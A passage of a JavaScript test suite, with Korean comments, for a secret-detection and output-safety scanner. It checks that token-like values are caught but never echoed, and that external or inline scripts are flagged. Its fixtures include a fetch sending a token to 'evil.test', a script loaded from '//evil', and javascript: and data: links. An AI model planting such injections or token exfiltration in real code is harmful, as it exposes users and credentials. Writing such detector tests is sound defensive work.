  assert.deepEqual(await kvSev(j('u=', HTTPS, 'h.test/?access_', 'token=Qa7b%2B', 'Cd8eFg9hJk2mNp4r')), ['FAIL']);
  for (const l of [
    j('u=', HTTPS, 'h.test/?q=%ED%95%9C%EA%B8%80'),
    j('u=', HTTPS, 'h.test/?redirect_uri=', 'https%3A%2F%2Fh.test%2Fcb'),
    j('u=', HTTPS, 'h.test/?access%5F', 'token=%3Ctoken%3E'),
    j('u=', HTTPS, 'h.test/?access%5', 'token=', QA2_RND),
  ]) {
    assert.deepEqual(await kvSev(l), [], l);
    assert.deepEqual(urlQueryKvHits(l), [], l);
  }
});

// ── 230 — Codex night-qa3 C7 1~5 ─────────────────────────────
//   합성 실값(위반 리터럴 0 — 런타임 조립). 메시지 노출 검사는 각 값의 앞 6자 조각까지 본다.
const QA3_A = j('Qa7bCd8eFg9h', 'Jk2mNp4r'); // Codex 재현 값(20자)
const QA3_B = j('Zx9yWv8uTs7r', 'Qp6oNm5lKj'); // 22자
const QA3_C = j('Mn3bVc4xZl5k', 'Jh6gFd7sAp'); // 22자
const QA3_D = j('gh12ij34kl56', 'mn78op90qr12'); // 소문자+숫자 24자(Bearer)
const leaks = (text, vals = [QA3_A, QA3_B, QA3_C, QA3_D]) => vals.filter((v) => text.includes(v.slice(0, 6)) || text.includes(v.slice(-6)));

test('C7-SECRET 230 C7-1: 문법 오류 진단은 고정 문구 + 줄·열 숫자만(JSON.parse 메시지의 원문 조각 0)', async () => {
  const { jsonC7Hits, jsonSyntaxErrorAt } = await import('../lib/rules-source.mjs');
  // Codex 재현 입력 그대로 + 따옴표 없는 값만 + 줄 여러 개.
  const cases = [
    [j('{"tok', 'en":', QA3_A, '}'), '줄 1 열 10'],
    [QA3_A, '줄 1 열 1'],
    [j('{\n  "a": 1,\n  "pass', 'word": ', QA3_B, '\n}'), '줄 3 열 15'],
    [j('{"a":"', QA3_C, '" "b":1}'), '줄 1 열 '],
  ];
  for (const [text, where] of cases) {
    const h = jsonC7Hits(text);
    assert.equal(h.length, 1, text);
    assert.equal(h[0].severity, 'FAIL');
    assert.ok(h[0].message.startsWith('JSON 디코딩 검사 불가 — 문법 오류'), h[0].message);
    assert.ok(h[0].message.includes(where), h[0].message);
    assert.deepEqual(leaks(h[0].message), [], h[0].message);
  }
  // 위치 검사기 — JSON.parse 와 통과·실패가 같다(조각 조합 대조) · 재귀 없음(깊이 20만).
  const BS = String.fromCharCode(92);
  const parts = ['{', '}', '[', ']', ',', ':', '"a"', j('"', BS, 'u00zz"'), j('"', BS, 'n"'), j('"', BS, 'x"'), '1', '-0', '01', '1.', '1e+2', 'true', 'nul', 'null', ' ', '\n', '"', BS, 'x', '"\t"', '.5'];
  let seed = 230;
  const rnd = (n) => { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; return (seed >>> 8) % n; };
  let okN = 0;
  for (let i = 0; i < 20000; i++) {
    let s = '';
    for (let k = 0, len = 1 + rnd(10); k < len; k++) s += parts[rnd(parts.length)];
    let ok = true;
    try { JSON.parse(s); } catch { ok = false; }
    assert.equal(jsonSyntaxErrorAt(s) < 0, ok, JSON.stringify(s));
    if (ok) okN++;
  }
  assert.ok(okN > 200, `정상 표본 ${okN}`);
  assert.equal(jsonSyntaxErrorAt('['.repeat(200000)), 200000);
  assert.equal(jsonSyntaxErrorAt(`${'['.repeat(200000)}${']'.repeat(200000)}`), -1);
});

test('C7-SECRET 230 C7-1: 스캐너 전체 — 합성 실값이 어떤 FAIL/WARN 메시지(CLI 사람용·JSON 출력)에도 나오지 않음', async () => {
  const root = await makeRoot({
    source: (s) => {
      // C7 문법 오류(docs JSON) · JSON 키 자체가 토큰인 맵(키 경로) · 시드 폴더 JSON 문법 오류(C0-SEED).
      s['docs/design/leak-syntax.json'] = j('{"tok', 'en":', QA3_A, '}\n');
      // 값의 '=' 를 = 이스케이프로 — 원문 줄 검사는 못 보고 디코딩 단계만 잡아, 키 경로가 메시지에 들어가는 경로를 탄다.
      s['docs/design/leak-keypath.json'] = j('{"map":{"', QA3_B, '":"pass', 'word', String.fromCharCode(92), 'u003d', QA3_C, '"}}\n');
      s['server/seed/leak-broken.json'] = j('[{"id":', QA3_C, '}]\n');
      // C1-FETCH(사용자 정보 토큰) · C2-TRADE(라우트 문자열 질의 속 토큰).
      s['client/src/leak.ts'] = `export const a = () => ${FETCH}('${HTTPS}${QA3_D}@evil.test/x');\nexport const r = '/orders?k=${QA3_A}';\n`;
    },
    seed: (d) => {
      d['curated-products.json'][0].imageAsset = j(HTTPS, 'cdn.test/a.jpg?sig=', QA3_B);
      d['curated-products.json'][0].imageLicense = QA3_C;
    },
  });
  const res = scan(root);
  assert.equal(res.code, 1);
  const rules = new Set(res.json.findings.map((f) => f.rule));
  for (const r of ['C7-SECRET', 'C0-SEED', 'C1-FETCH', 'C2-TRADE', 'C1-SEEDURL', 'C6-IMG']) assert.ok(rules.has(r), `${r} 없음: ${JSON.stringify([...rules])}`);
  // 문법 오류 진단은 줄·열 숫자를 담는다.
  assert.ok(res.json.findings.some((f) => f.file === 'docs/design/leak-syntax.json' && /줄 1 열 10/.test(f.message)), JSON.stringify(c7All(res, 'docs/design/leak-syntax.json')));
  assert.ok(res.json.findings.some((f) => f.rule === 'C0-SEED' && /시드 JSON 파싱 실패\(줄 1 열 \d+\)/.test(f.message)));
  // 키 경로가 비밀 형태면 길이만(디코딩 단계 메시지).
  assert.ok(c7All(res, 'docs/design/leak-keypath.json').some((f) => f.message.includes('JSON 키 ‹가림')), JSON.stringify(c7All(res, 'docs/design/leak-keypath.json')));
  assert.deepEqual(leaks(JSON.stringify(res.json.findings)), [], JSON.stringify(res.json.findings, null, 1));
  // 사람용 CLI 출력(stdout·stderr) 전체.
  const human = spawnSync(process.execPath, [SCANNER, '--root', root, '--now', FIXED_NOW], { encoding: 'utf8' });
  assert.equal(human.status, 1);
  assert.ok(human.stdout.includes('C7-SECRET'), human.stdout);
  assert.deepEqual(leaks(human.stdout + human.stderr), [], human.stdout);
});

// ── 233 — QA231 §3: 산출물 규칙(rules-output)·설정 오류(normalize)·prisma/package/소스 HTML 식별자 메시지 ─────
//   합성 실값 5종(대소문자 20~22자 3종·소문자+숫자 24자·ghp_ 접두형)의 앞뒤 6자 조각이 --json·사람용 stdout·stderr 어디에도 없어야 한다.
//   속성·태그 이름은 파서가 소문자로 바꾸므로 소문자 값(QA3_D)으로 넣는다.
const QA3_G = j('gh', 'p_', 'Ab3dEf5hIj7lMn9pQr1tUv3xYz5bCd7fGh9j');
const leaks233 = (text) => leaks(text, [QA3_A, QA3_B, QA3_C, QA3_D, QA3_G]);
function cliBoth(root) {
  const res = scan(root);
  const human = spawnSync(process.execPath, [SCANNER, '--root', root, '--now', FIXED_NOW], { encoding: 'utf8' });
  return { res, human, all: `${res.stdout}\n${res.stderr}\n${human.stdout}\n${human.stderr}` };
}

test('C7-SECRET 233: 산출물 규칙 메시지(route·sitemap·script src·javascript:/data: href·noopener·link·img·form·data-ws-*·ws-data·카탈로그·C9·DRAFTSRC·TAXON) — 합성 실값 조각 0, 위치·규칙 id 유지', async () => {
  const longJs = j('javascript', ':', FETCH, "('/x?k=", QA3_A, "')"); // 40자 넘김 — 자르기 전에 판정해야 한다
  const draftUrl = j(HTTPS, 'example.org/guide/', QA3_B, '/care-sheet-long-path-over-sixty-characters');
  const ws = {
    v: 2,
    route: { kind: 'TYPE', path: '/x', typeId: QA3_A },
    layer: { kind: 'ITEM', typeId: QA3_B, itemId: QA3_C, productId: QA3_D },
    catalogUrl: '/data/catalog.v1.abcd1234.json',
    data: { requirements: [{ animalTypeId: QA3_A, supplyItemId: QA3_D, searchKeyword: 'k', sourceRefs: [QA3_C], item: { id: QA3_B, alternativeIds: [QA3_G] } }], [QA3_B]: [] },
    sources: [{ url: j('http://h.test/', QA3_C), title: 't', [QA3_D]: 1 }],
    [QA3_A]: { [QA3_C]: KO.best },
  };
  const root = await makeRoot({
    seed: (d) => {
      d['supply-items.json'][1].source = [{ url: draftUrl, title: 'draft guide', accessedAt: '2026-09-30' }];
      d['taxa.json'].push({ ...d['taxa.json'][0], id: QA3_C, ...meta({ contentKind: 'LEGAL', reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null }) });
    },
    output: (o) => {
      o['index.html'] = page([
        '<main class="ws-page" data-ws-route="HOME">',
        `<script src="${HTTPS}cdn.test/x.js?access_token=${QA3_A}"></script>`,
        `<script src="${HTTPS}cdn.test/${QA3_D}/x.js"></script>`,
        `<a href="${longJs}">x</a>`,
        `<a href="data:text/html,${QA3_B}">x</a>`,
        `<a href="${HTTPS}ext.test/?tok${'en'}=${QA3_A}">x</a>`,
        `<a href="${HTTPS}ext.test/p/${QA3_D}">y</a>`,
        `<img src="${HTTPS}ext.test/${QA3_G}/a.png">`,
        `<form action="${HTTPS}ext.test/?k=${QA3_A}"></form>`,
        `<div data-ws-id="curatedProducts#${QA3_A}"></div>`,
        `<div data-ws-type="${QA3_B}"></div>`,
        `<link rel="stylesheet" href="${HTTPS}ext.test/${QA3_G}.css">`,
        `<link rel="stylesheet" href="${HTTPS}cdn.example/style.css">`,
        `<x${QA3_D} on${QA3_D}="x" data-z="${longJs}"></x${QA3_D}>`,
        `<script type="text/${QA3_D}">1</script>`,
        `<p>${draftUrl} ${QA3_C}</p>`,
        '</main>',
      ].join(''), ws);
      o['privacy/index.html'] = page([
        privacyMain({ user: QA3_A }).replace('</main>', ''),
        `<p>${policySpan(QA3_B, 7)} {{KEN${'NY'}:${QA3_C}}}</p></main>`,
      ].join(''));
      o['sitemap.xml'] = `<?xml version="1.0"?><urlset><url><loc>http://localhost:3001/${QA3_A}</loc></url></urlset>`;
      o['data/catalog.v1.abcd1234.json'] = JSON.stringify({
        v: 1, seedDigest: QA3_G, [QA3_A]: [{ id: 1 }], animalTypes: [{ id: QA3_B, taxonId: QA3_C }], supplyItems: [{ id: 'cage', name: KO.best, [QA3_D]: KO.best }],
      });
    },
    manifest: (dg) => {
      const m = manifestFor(dg, { mode: QA3_A, seedDigest: QA3_B });
      m.routes.push(
        { path: `/${QA3_D}`, file: `${QA3_A}.html`, kind: QA3_C, typeId: QA3_D, itemId: QA3_B, productId: QA3_C, region: QA3_A, indexable: true },
        { path: `/hamster/golden/${QA3_G}`, file: 'index.html', kind: 'TYPE', typeId: 'hamster-golden', layer: { typeId: QA3_A }, indexable: true },
        `route-${QA3_G}`,
      );
      return m;
    },
  });
  const { res, human, all } = cliBoth(root);
  assert.equal(res.code, 1);
  assert.equal(human.status, 1);
  const rules = new Set(res.json.findings.map((f) => f.rule));
  for (const r of ['C3-OUT-ROUTE', 'C8-OUT-SAFE', 'C3-OUT-ID', 'C3-OUT-SRC', 'C9-PRIVACY', 'C3-OUT-DRAFTSRC', 'C3-OUT-TAXON', 'C4-BANNED']) assert.ok(rules.has(r), `${r} 없음: ${JSON.stringify([...rules])}`);
  assert.deepEqual(leaks233(all), [], JSON.stringify(res.json.findings, null, 1));
  // 위치(파일·줄)·규칙 id 는 그대로, 가린 값은 길이만.
  const of = (rule, re) => res.json.findings.filter((f) => f.rule === rule && re.test(f.message));
  assert.ok(of('C8-OUT-SAFE', /^외부·비정상 script src: ‹가림 \d+자›$/).every((f) => f.file === 'client/dist/index.html' && Number.isInteger(f.line)));
  assert.equal(of('C8-OUT-SAFE', /^외부·비정상 script src: ‹가림/).length, 2);
  assert.ok(of('C8-OUT-SAFE', /^위험 href: ‹가림 \d+자›$/).length >= 1, JSON.stringify(res.json.findings));
  assert.ok(of('C3-OUT-ROUTE', /^manifest indexable 밖 URL: ‹가림/).some((f) => f.file === 'sitemap.xml'));
  assert.ok(of('C3-OUT-ROUTE', /^seedDigest 불일치: manifest ‹가림 \d+자› ≠ server\/seed [0-9a-f]{64}$/).length === 1, JSON.stringify(res.json.findings));
  assert.ok(of('C9-PRIVACY', /페이지 "‹가림 \d+자›" ≠ policy\.ts 365/).length === 1, JSON.stringify(res.json.findings));
  // 비밀 형태가 아닌 일반 URL 은 그대로 보인다(safeLabel 이 가른다).
  assert.ok(of('C8-OUT-SAFE', /^외부 <link href>: https:\/\/cdn\.example\/style\.css$/).length === 1, JSON.stringify(res.json.findings));
});

test('C7-SECRET 233: manifest 파싱 실패 — JSON.parse 메시지 대신 줄·열 숫자만', async () => {
  for (const [body, where] of [
    [j('{"v":1,"tok', 'en":', QA3_A, '}'), '줄 1 열 16'],
    [j('{"v":1,"routes":[', QA3_B, ']}'), '줄 1 열 18'],
    [j('{"v":1,\n"x":', QA3_D, '}'), '줄 2 열 5'],
    [j('{"v":1,"x":"', QA3_G, '" "y":1}'), '줄 1 열 '],
  ]) {
    const root = await makeRoot({ output: noop, manifest: () => null });
    writeTree(root, { 'client/dist/prerender-manifest.json': body });
    const { res, all } = cliBoth(root);
    expectFail(res, 'C3-OUT-ROUTE');
    const f = res.json.findings.filter((x) => x.rule === 'C3-OUT-ROUTE' && x.file === 'prerender-manifest.json');
    assert.ok(f.some((x) => x.message.startsWith('manifest 파싱 실패(JSON 문법 오류 ') && x.message.includes(where)), JSON.stringify(f));
    assert.deepEqual(leaks233(all), [], all);
  }
});

test('C7-SECRET 233: banned-words CONFIG ERROR(normalize) — JSON 문법 오류는 줄·열, 정규식 오류는 V8 고정 사유만(패턴 원문 0)', async () => {
  const cases = [
    [j('{"v":1,"banned":[', QA3_A, ']}'), /파싱 실패\(JSON 문법 오류 줄 1 열 18\)/],
    [j('{"v":1,"tok', 'en":', QA3_B, '}'), /파싱 실패\(JSON 문법 오류 줄 1 열 16\)/],
    [j('{"v":1,"banned":["', QA3_C, '" "x"]}'), /파싱 실패\(JSON 문법 오류 줄 1 열 /],
    [JSON.stringify({ v: 1, banned: [{ term: 'x', pattern: j('(', QA3_A) }] }), /banned\[0\] 정규식 오류\(Unterminated group\)/],
    [JSON.stringify({ v: 1, banned: [{ term: 'x', pattern: 'a' }], stems: [{ term: 'y', pattern: j('[z-a', QA3_G, ']') }] }), /stems\[0\] 정규식 오류\(Range out of order in character class\)/],
    [JSON.stringify({ v: 1, banned: [{ term: 'x', pattern: j(QA3_D, ': ', QA3_B, '[') }] }), /banned\[0\] 정규식 오류\(Unterminated character class\)/],
  ];
  for (const [body, re] of cases) {
    const root = await makeRoot({ source: (s) => { s['server/src/seed/banned-words.json'] = body; } });
    const { res, human, all } = cliBoth(root);
    assert.equal(res.code, 2, res.stderr);
    assert.equal(human.status, 2);
    assert.match(res.stderr, re);
    assert.deepEqual(leaks233(all), [], all);
  }
});

test('C7-SECRET 233: prisma 모델·컬럼, package.json 의존성, 소스 HTML 태그·속성 이름 — 식별자도 safeLabel', async () => {
  const root = await makeRoot({
    source: (s) => {
      s['server/prisma/schema.prisma'] = `${s['server/prisma/schema.prisma']}\nmodel Payment${QA3_A} {\n  id String @id\n  price${QA3_B} Int\n  x${QA3_C}Lat Float\n}\n`;
      s['client/package.json'] = JSON.stringify({ name: 'c', dependencies: { react: '^18', [`@playwright/${QA3_D}`]: '1' }, devDependencies: { jsdom: '^29' } });
      s['client/index.html'] = `<!doctype html><html><body><x${QA3_D} on${QA3_D}="x" data-${QA3_D}="javascript:void(0)"></x${QA3_D}></body></html>\n`;
    },
  });
  const { res, all } = cliBoth(root);
  for (const r of ['C2-TRADE', 'C2-PRICE', 'C5-GEO', 'C1-LIB', 'C8-SRC-SAFE']) expectFail(res, r);
  const pr = res.json.findings.filter((f) => f.file === 'server/prisma/schema.prisma');
  assert.ok(pr.some((f) => f.rule === 'C2-TRADE' && /^거래·분양·결제 모델: ‹가림 \d+자›$/.test(f.message) && Number.isInteger(f.line)), JSON.stringify(pr));
  assert.deepEqual(leaks233(all), [], all);
});

test('C7-SECRET 230: safeLabel·redactMessage — 비밀 형태 값은 길이만, 일반 식별자는 그대로', async () => {
  const { safeLabel, redactMessage } = await import('../lib/rules-source.mjs');
  assert.equal(safeLabel(QA3_A), `‹가림 ${QA3_A.length}자›`);
  assert.equal(safeLabel(j('map.', QA3_B)), `‹가림 ${QA3_B.length + 4}자›`);
  assert.equal(safeLabel(j('tok', 'en=abc12345XY')), '‹가림 16자›'); // C7 kv 규칙에 걸리는 짧은 값(WARN 형태)
  for (const ok of ['cp-001', 'compilerOptions.paths', 'golden-hamster-wheel-30cm', 'ACTIVE', 'CC_BY']) assert.equal(safeLabel(ok), ok);
  assert.equal(safeLabel('x'.repeat(121)), '‹생략 121자›');
  assert.equal(redactMessage('하드코딩 시크릿 키=값(소문자·JSON 키 이름, 16자 이상)'), '하드코딩 시크릿 키=값(소문자·JSON 키 이름, 16자 이상)');
  assert.ok(!redactMessage(j('x — pass', 'word=', QA3_A)).includes(QA3_A.slice(0, 6)));
});

test('C7-SECRET 230 C7-2: 비ASCII·잘못된·이중 퍼센트 인코딩 질의 값 → 디코딩 후 FAIL(원문·JSON·대문자 env URL 끝)', async () => {
  const { c7LineHits, jsonC7Hits, urlQueryKvHits } = await import('../lib/rules-source.mjs');
  const jsonFail = (t) => jsonC7Hits(t).some((h) => h.severity === 'FAIL');
  const codex = j('u=', HTTPS, 'h.test/?pass%77', 'ord=%ED%95%9C', QA3_A);
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  assert.deepEqual(urlQueryKvHits(codex), ['FAIL']);
  assert.ok(jsonFail(JSON.stringify({ u: codex })));
  const pos = [
    j('u=', HTTPS, 'h.test/?pass%77', 'ord=%ed%95%9c', QA3_A), // 소문자 hex
    j('u=', HTTPS, 'h.test/?pass', 'word=%FF', QA3_A), // 잘못된 바이트 선두(U+FFFD — % 시작 제외에 다시 걸리지 않음)
    j('u=', HTTPS, 'h.test/?pass', 'word=%ED%95', QA3_A), // 잘린 3바이트 시퀀스
    j('u=', HTTPS, 'h.test/?pass', 'word=%F0%9F%90%B9', QA3_A), // 4바이트
    j('u=', HTTPS, 'h.test/?pass%2577', 'ord=', QA3_A), // 이중 인코딩 키
    j('u=', HTTPS, 'h.test/?pass', 'word=%25ED%2595%259C', QA3_A), // 이중 인코딩 값 선두
    j('see ', HTTPS, 'h.test/cb#pass%77', 'ord=%ED%95%9C', QA3_A, '&x=1'), // 프래그먼트
  ];
  for (const l of pos) {
    assert.deepEqual(await kvSev(l), ['FAIL'], l);
    assert.ok(jsonFail(JSON.stringify({ u: l })), l);
  }
  assert.ok(c7LineHits(j('TOKEN', '_URL=', HTTPS, 'h.test/cb?pass%77', 'ord=%ED%95%9C', QA3_A), true).length > 0);
  // 음성: 한글 질의·자리표시·비밀 아닌 키·과잉 표현(%C0%AF)·서로게이트(%ED%A0%80) 단독 값.
  for (const l of [
    j('u=', HTTPS, 'h.test/?q=%ED%95%9C%EA%B8%80'),
    j('u=', HTTPS, 'h.test/?access%5F', 'token=%3Ctoken%3E'),
    j('u=', HTTPS, 'h.test/?q=%ED%95%9C', QA3_A),
    j('u=', HTTPS, 'h.test/?pass', 'word=%C0%AF%ED%A0%80'),
  ]) {
    assert.deepEqual(await kvSev(l), [], l);
    assert.deepEqual(urlQueryKvHits(l), [], l);
  }
});

test('C7-SECRET 230 C7-2 성능: 퍼센트 디코더 최악 모양 ×2 4단계 — 줄 길이에 비례(예외 없음)', async () => {
  const { c7LineHits } = await import('../lib/rules-source.mjs');
  const shapes = [
    (n) => j('u=', HTTPS, 'h.test/?', 'k%=v%&'.repeat(n)),
    (n) => j('u=', HTTPS, 'h.test/?', j('pass', 'word=%FF', QA3_A, '&').repeat(n)),
    (n) => j('u=', HTTPS, 'h.test/?pass', 'word=', '%C3'.repeat(n * 3)),
    (n) => j('u=', HTTPS, 'h.test/?pass', 'word=', '%ED%95%9C'.repeat(n)),
  ];
  for (const mk of shapes) {
    const ms = [2000, 4000, 8000, 16000].map((n) => {
      const l = mk(n);
      c7LineHits(l, false);
      const t = process.hrtime.bigint();
      c7LineHits(l, false);
      return Number(process.hrtime.bigint() - t) / 1e6;
    });
    // 제곱이면 16000 단계가 2000 단계의 64배 — 선형 상한(8배)에 잡음 여유를 둔 절대 상한.
    assert.ok(ms[3] < 1500, `${mk(1).slice(0, 40)}: ${ms.map((x) => x.toFixed(1)).join('/')}ms`);
  }
});

test('C7-SECRET 230 C7-3: Bearer 비hex `/…` 토큰 → FAIL(원문·JSON·코드), API 경로는 계속 제외', async () => {
  const { c7LineHits, jsonC7Hits } = await import('../lib/rules-source.mjs');
  const codex = j('{"Authorization":"Bea', 'rer /', QA3_D, '"}');
  assert.deepEqual(await kvSev(codex), ['FAIL']);
  assert.ok(jsonC7Hits(codex).some((h) => h.severity === 'FAIL'));
  const pos = [
    j('Authorization: Bea', 'rer /ab12cd34ef56ab78cd90ef12/ab'), // Codex 두 번째 재현
    j('Authorization: Bea', 'rer /Qa7bCd8e/Fg9hJk2m/Np4rXy12'), // 짧은 마디로 쪼갠 대·소·숫 토큰
    j('Authorization: Bea', 'rer ./', QA3_D),
    j('Authorization: Bea', 'rer ~/', QA3_D),
    j('authorization: bea', 'rer /', QA3_D),
    j('Authorization: Bea', 'rer /static/0123456789abcdef01/app.js'), // 220 음성 → 230 양성(토큰 형태 마디)
  ];
  for (const l of pos) {
    assert.deepEqual(await kvSev(l), ['FAIL'], l);
    assert.ok(c7LineHits(l, true).length > 0, l);
  }
  for (const l of [j('Authorization: Bea', 'rer /api/v1/users/profile'), j('Bea', 'rer /healthcheck-ready'), j('Bea', 'rer /oauth2/v2/token/refresh')]) {
    assert.deepEqual(await kvSev(l), [], l);
    assert.deepEqual(c7LineHits(l, true), [], l);
  }
});

test('C7-SECRET 230 C7-4: 경로 이름 끝(_file·_path·_dir)의 접두 없는 상대 경로는 제외 — 우회(토큰형 마디·일반 이름·주소 끝)는 FAIL', async () => {
  const { c7LineHits, jsonC7Hits, secretKvHits, secretKvHitsSimple } = await import('../lib/rules-source.mjs');
  const neg = [
    j('{"client_secret', '_file":"config/secret-v2.txt"}'), // Codex 재현
    j('client_secret', '_file=config/secret-v2.txt'),
    j('token', '_path: keys/550e8400-e29b-41d4-a716-446655440000.json'),
    j('{"secret', '_dir":"var/lib/withsmall2"}'), // 확장자 없음 + 마디 3개
    j('CLIENT_SECRET', '_FILE=config/secret-v2.txt'),
    j('  CLIENT_SECRET', '_FILE: config/secret-v2.txt'),
    j('ENV CLIENT_SECRET', '_FILE=config/secret-v2.txt'),
  ];
  for (const l of neg) {
    assert.deepEqual(c7LineHits(l, false), [], l);
    assert.deepEqual(c7LineHits(l, true), [], l);
    assert.deepEqual(secretKvHits(l), secretKvHitsSimple(l), l);
  }
  assert.deepEqual(jsonC7Hits(neg[0]), []);
  assert.deepEqual(jsonC7Hits(neg[3]), []);
  // 예외를 우회 통로로: 값이 상대 경로 모양이어도 토큰형 마디·조각이면 FAIL / 경로 끝이 아닌 이름은 넓히지 않음.
  const pos = [
    j('{"client_secret', '_file":"', QA3_A, '/x.txt"}'), // 무작위 마디
    j('{"client_secret', '_file":"', QA3_D, '/a.txt"}'), // 소문자+숫자 24자
    j('{"token', '_path":"abcdef0123456789abcd/x.json"}'), // hex 마디
    j('{"pass', 'word_file":"', QA2_HUNTER, '/x.txt"}'), // 글자+숫자 12자 이상 조각
    j('{"secret', '_dir":"abc123/def456ghi"}'), // 확장자 없음 + 마디 2개(경로 형태 아님)
    j('{"client', '_secret":"config/secret-v2.txt"}'), // 일반 비밀 이름 — 제외 안 넓힘
    j('{"token', '_url":"config/secret-v2.txt"}'), // 주소 끝 — URL 값만 제외
  ];
  for (const l of pos) {
    assert.deepEqual(await kvSev(l), ['FAIL'], l);
    assert.ok(jsonC7Hits(l).some((h) => h.severity === 'FAIL'), l);
    assert.deepEqual(secretKvHits(l), secretKvHitsSimple(l), l);
  }
  assert.ok(c7LineHits(j('CLIENT_SECRET', '_FILE=', QA2_HUNTER, '/x.txt'), true).length > 0);
  assert.ok(c7LineHits(j('CLIENT_SECRET=config/secret-v2.txt'), true).length > 0);
  // 같은 런 안 후보 반복(질의 속 secret_file=…&) — 상대 경로 판정이 줄 길이에 비례.
  for (const n of [4000, 16000]) {
    const l = j('u=', HTTPS, 'h.test/?', j('secret', '_file=a/b.txt&').repeat(n));
    c7LineHits(l, false);
    const t = process.hrtime.bigint();
    c7LineHits(l, false);
    assert.ok(Number(process.hrtime.bigint() - t) / 1e6 < 1000, `${n}`);
  }
});

test('C7-SECRET 230 C7-5: 닫히지 않은 블록 주석 → 문법 오류 FAIL(조용히 0 아님), 닫힌 주석은 그대로 걷어 냄', async () => {
  const { jsonC7Hits, stripJsonc } = await import('../lib/rules-source.mjs');
  for (const bad of ['{"safe":0} /*', '{"safe":0} /* x', '{"a":1 /* c */} /*', '/*', j('{"a":1}\n/* ', QA3_A)]) {
    const h = jsonC7Hits(bad);
    assert.equal(h.length, 1, bad);
    assert.equal(h[0].severity, 'FAIL', bad);
    assert.ok(h[0].message.startsWith('JSON 디코딩 검사 불가 — 문법 오류'), h[0].message);
    assert.deepEqual(leaks(h[0].message), []);
  }
  assert.deepEqual(jsonC7Hits('{"safe":0} /* 닫힘 */'), []);
  assert.equal(stripJsonc('{"a":1} /* x').length, '{"a":1} /* x'.length);
  // 미종결 주석 반복 최악 모양 — 첫 미종결에서 멈춘다(선형).
  const big = j('{"a":1} ', '/*'.repeat(200000));
  const t = process.hrtime.bigint();
  assert.equal(jsonC7Hits(big)[0].severity, 'FAIL');
  assert.ok(Number(process.hrtime.bigint() - t) / 1e6 < 1000);
});

test('C7-SECRET 201 MED-3: 제외 값이 겹치는 긴 한 줄(83,200자·200,000자) — 200ms 안, 질의 속 access_token 재탐색은 유지', async () => {
  const { c7LineHits, secretKvHits } = await import('../lib/rules-source.mjs');
  const unit = j('token', '_url=', HTTPS, 'a.test/?');
  const inputs = [unit.repeat(3200), unit.repeat(Math.ceil(200000 / unit.length)), j('access', '_token=', HTTPS, 'a.test/').repeat(6000)];
  assert.equal(inputs[0].length, 83200);
  for (const line of inputs) {
    c7LineHits(line, false); // 데우기(JIT) — 측정은 두 번째
    const t = process.hrtime.bigint();
    const hits = c7LineHits(line, false);
    const ms = Number(process.hrtime.bigint() - t) / 1e6;
    assert.ok(ms < 200, `${line.length}자: ${ms.toFixed(1)}ms`);
    assert.deepEqual(hits, [], `${line.length}자`);
  }
  // 같은 긴 줄 끝의 질의 토큰은 잡는다(되돌림 없이 값 안을 이어서 찾는다).
  const tail = j(unit.repeat(3200), 'cb?access', '_token=', HEX64);
  const t = process.hrtime.bigint();
  assert.deepEqual(secretKvHits(tail), ['FAIL']);
  assert.ok(Number(process.hrtime.bigint() - t) / 1e6 < 200);
  assert.deepEqual(secretKvHits(j('token', '_url=', HTTPS, 'h/cb?access', '_token=', HEX64)), ['FAIL']);
});

test('C7-SECRET 201 MED-3: 한 번 순회(secretKvHits)와 원형(secretKvHitsSimple) 결과가 같다 — 조각 조합 무작위 대조', async () => {
  const { secretKvHits, secretKvHitsSimple } = await import('../lib/rules-source.mjs');
  const parts = [
    j('token', '_url='), j('access', '_token='), j('client', '_secret: '), j('token', '_id='), j('api', '_key="'), j('pass', 'word_file='), 'x', ' ', '/', './', '../', '~/', '?', '&', '#', '@', ':', '"', ',',
    HTTPS, j('ssh', '://'), 'a.test', RND, HEX64, 'abc123', 'run/secrets', 'Ab3dEf9h', '12Kx7Yz34', 'example', '$X', '{y}', '%z',
    // 206: 긴 hex 이름 끝 제외 뒤집기(_min·_max)와 hex 가 자연스러운 이름 끝(_hash·_id) 유지도 같은 결과인지 대조.
    j('secret', '_min='), j('token', '_max: '), j('token', '_hash='), HEXL, HEXL.toUpperCase(), 'abcdef0123',
  ];
  let seed = 201;
  const rnd = (n) => { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; return (seed >>> 8) % n; }; // 32비트 정수 LCG(배정밀도 넘침 없음)
  const tally = { FAIL: 0, WARN: 0 };
  for (let i = 0; i < 4000; i++) {
    let line = '';
    const len = 1 + rnd(14);
    for (let k = 0; k < len; k++) line += parts[rnd(parts.length)];
    const got = secretKvHits(line);
    assert.deepEqual(got, secretKvHitsSimple(line), JSON.stringify(line));
    for (const s of got) tally[s]++;
  }
  // 대조가 빈 결과끼리만 비교하지 않음을 고정(생성기 퇴화 방지).
  assert.ok(tally.FAIL > 100 && tally.WARN > 10, JSON.stringify(tally));
});

// ── C8 산출물 안전 ──────────────────────────────────────────
test('C8-OUT-SAFE: 외부 script src', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</body>', j('<script src="', HTTPS, 'cdn.x/y.js"></script></body>')); } }));
  expectFail(res, 'C8-OUT-SAFE');
});

test('C8-OUT-SAFE: 프로토콜 상대 script src(//host)', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</body>', '<script src="//evil/x.js"></script></body>'); } }));
  expectFail(res, 'C8-OUT-SAFE');
});

test('C8-OUT-SAFE: 같은 오리진 비모듈 script src(/registerSW.js)는 통과', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</body>', '<script defer src="/registerSW.js"></script></body>'); } }));
  expectClean(res);
});

test('C8-OUT-SAFE: 인라인 JS', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</body>', '<script>alert(1)</script></body>'); } }));
  expectFail(res, 'C8-OUT-SAFE');
});

test('C8-OUT-SAFE: JSON 블록 속 </', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('"data":{', '"x":"</b>","data":{'); } }));
  expectFail(res, 'C8-OUT-SAFE');
});

test('C8-OUT-SAFE: iframe·외부 link·noopener 없는 외부 a', async () => {
  for (const add of [
    '<iframe src="/x"></iframe>',
    j('<link rel="stylesheet" href="', HTTPS, 'cdn.x/a.css">'),
